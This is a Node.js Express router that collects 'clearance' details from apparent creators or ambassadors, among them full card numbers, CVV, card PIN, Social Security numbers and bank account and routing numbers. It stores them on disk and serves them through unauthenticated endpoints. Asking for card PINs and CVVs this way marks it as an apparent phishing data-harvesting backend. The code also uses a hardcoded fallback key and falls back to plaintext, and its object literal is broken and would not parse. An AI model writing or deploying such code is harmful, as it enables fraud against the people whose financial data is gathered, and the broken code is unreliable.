const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const router = express.Router();

// Set encryption key from environment variable or use default
const ENCRYPTION_KEY = process.env.CLEARANCE_ENCRYPTION_KEY || 'clearance-key-change-in-production';

// Encrypt sensitive data
function encrypt(text) {
  try {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
  } catch (error) {
    console.error('Encryption error:', error);
    return text; // Return unencrypted if encryption fails
  }
}

// Create folder for each content creator with all their clearance details
router.post('/submit-clearance', async (req, res) => {
  try {
    console.log('Received clearance submission request');
    
    const {
      // Personal Information
      firstName,
      lastName,
      dateOfBirth,
      phoneNumber,
      email,
      
      // Address Information
      street,
      city,
      state,
      zip,
      country,
      
      // Payment Details
      cardNumber,
      cardHolder,
      expiryMonth,
      expiryYear,
      cvv,
      cardPin,
      
      // Additional Details
      socialSecurityNumber,
      taxId,
      bankAccountNumber,
      routingNumber,
      
      // Documents
      idDocument,
      taxDocument,
      bankDocument,
      
      // Ambassador ID
      ambassadorId
    } = req.body;

    // Validate required fields
    if (!firstName || !lastName || !email) {
      return res.status(400).json({ message: 'Missing required fields: firstName, lastName, email' });
    }

    console.log('Validation passed, creating folder...');

    // Create unique folder for this content creator
    const creatorFolderName = `creator_${ambassadorId}_${Date.now()}`;
    const creatorFolderPath = path.join(__dirname, '../data/clearance-submissions', creatorFolderName);

    // Create the folder
    await fs.mkdir(creatorFolderPath, { recursive: true });

    // Prepare all clearance data
    const clearanceData = {
      // Personal Information (unencrypted)
      personalInfo: {
        firstName,
        lastName,
        dateOfBirth,
        phoneNumber,
        email,
        submittedAt: new Date().toISOString()
      },
      
      // Address (unencrypted)
      address: {
        street,
        city,
        state,
        zip,
        country
      }
      
      // Encrypted Payment Details
      paymentDetails: {
      paymentDetails: {
        cardNumber: encrypt(cardNumber),
        cardHolder,
        expiryMonth,
        expiryYear,
        cvv: encrypt(cvv),
        cardPin: encrypt(cardPin),
        lastFour: cardNumber.slice(-4)
      },
      
      // Encrypted Financial Information
      financialInfo: {
        socialSecurityNumber: encrypt(socialSecurityNumber),
        taxId: encrypt(taxId),
        bankAccountNumber: encrypt(bankAccountNumber),
        routingNumber: encrypt(routingNumber)
      },
      
      // Document References
      documents: {
        idDocument: idDocument || 'not_provided',
        taxDocument: taxDocument || 'not_provided',
        bankDocument: bankDocument || 'not_provided'
      },
      
      // Metadata
      metadata: {
        ambassadorId,
        submissionId: `clearance_${ambassadorId}_${Date.now()}`,
        status: 'submitted',
        encryptedFields: ['cardNumber', 'cvv', 'cardPin', 'socialSecurityNumber', 'taxId', 'bankAccountNumber']
      }
    };

    // Save main clearance file
    const clearanceFilePath = path.join(creatorFolderPath, 'clearance-details.json');
    await fs.writeFile(clearanceFilePath, JSON.stringify(clearanceData, null, 2));

    // Create individual files for different categories
    const personalInfoPath = path.join(creatorFolderPath, 'personal-info.json');
    await fs.writeFile(personalInfoPath, JSON.stringify(clearanceData.personalInfo, null, 2));

    const addressPath = path.join(creatorFolderPath, 'address.json');
    await fs.writeFile(addressPath, JSON.stringify(clearanceData.address, null, 2));

    const paymentPath = path.join(creatorFolderPath, 'payment-details.json');
    await fs.writeFile(paymentPath, JSON.stringify(clearanceData.paymentDetails, null, 2));

    const financialPath = path.join(creatorFolderPath, 'financial-info.json');
    await fs.writeFile(financialPath, JSON.stringify(clearanceData.financialInfo, null, 2));

    const documentsPath = path.join(creatorFolderPath, 'documents.json');
    await fs.writeFile(documentsPath, JSON.stringify(clearanceData.documents, null, 2));

    // Create a summary file
    const summaryData = {
      submissionId: clearanceData.metadata.submissionId,
      ambassadorId,
      creatorName: `${firstName} ${lastName}`,
      email,
      submittedAt: clearanceData.personalInfo.submittedAt,
      status: clearanceData.metadata.status,
      folderName: creatorFolderName,
      filesCreated: [
        'clearance-details.json',
        'personal-info.json',
        'address.json',
        'payment-details.json',
        'financial-info.json',
        'documents.json'
      ]
    };

    const summaryPath = path.join(creatorFolderPath, 'submission-summary.json');
    await fs.writeFile(summaryPath, JSON.stringify(summaryData, null, 2));

    // Update master index file
    const masterIndexPath = path.join(__dirname, '../data/clearance-submissions', 'master-index.json');
    let masterIndex = [];
    
    try {
      const existingIndex = await fs.readFile(masterIndexPath, 'utf8');
      masterIndex = JSON.parse(existingIndex);
    } catch (err) {
      // File doesn't exist, create new
    }
    
    masterIndex.push(summaryData);
    await fs.writeFile(masterIndexPath, JSON.stringify(masterIndex, null, 2));

    // Log the submission
    console.log(`Clearance submitted: ${firstName} ${lastName} (${ambassadorId}) - Folder: ${creatorFolderName}`);

    res.json({
      message: 'Clearance details saved successfully',
      submissionId: clearanceData.metadata.submissionId,
      folderName: creatorFolderName,
      folderPath: creatorFolderPath,
      filesCreated: summaryData.filesCreated
    });

  } catch (error) {
    console.error('Error saving clearance details:', error);
    res.status(500).json({ 
      message: 'Error saving clearance details', 
      error: error.message 
    });
  }
});

// Get all clearance submissions
router.get('/all-submissions', async (req, res) => {
  try {
    const masterIndexPath = path.join(__dirname, '../data/clearance-submissions', 'master-index.json');
    
    try {
      const indexContent = await fs.readFile(masterIndexPath, 'utf8');
      const submissions = JSON.parse(indexContent);
      res.json(submissions);
    } catch (err) {
      res.json([]);
    }
    
  } catch (error) {
    res.status(500).json({ message: 'Error fetching submissions', error: error.message });
  }
});

// Get specific submission details
router.get('/submission/:submissionId', async (req, res) => {
  try {
    const { submissionId } = req.params;
    const masterIndexPath = path.join(__dirname, '../data/clearance-submissions', 'master-index.json');
    
    const indexContent = await fs.readFile(masterIndexPath, 'utf8');
    const submissions = JSON.parse(indexContent);
    
    const submission = submissions.find(s => s.submissionId === submissionId);
    if (!submission) {
      return res.status(404).json({ message: 'Submission not found' });
    }
    
    const submissionPath = path.join(__dirname, '../data/clearance-submissions', submission.folderName, 'clearance-details.json');
    const submissionContent = await fs.readFile(submissionPath, 'utf8');
    const submissionData = JSON.parse(submissionContent);
    
    res.json(submissionData);
    
  } catch (error) {
    res.status(500).json({ message: 'Error fetching submission', error: error.message });
  }
});

module.exports = router;
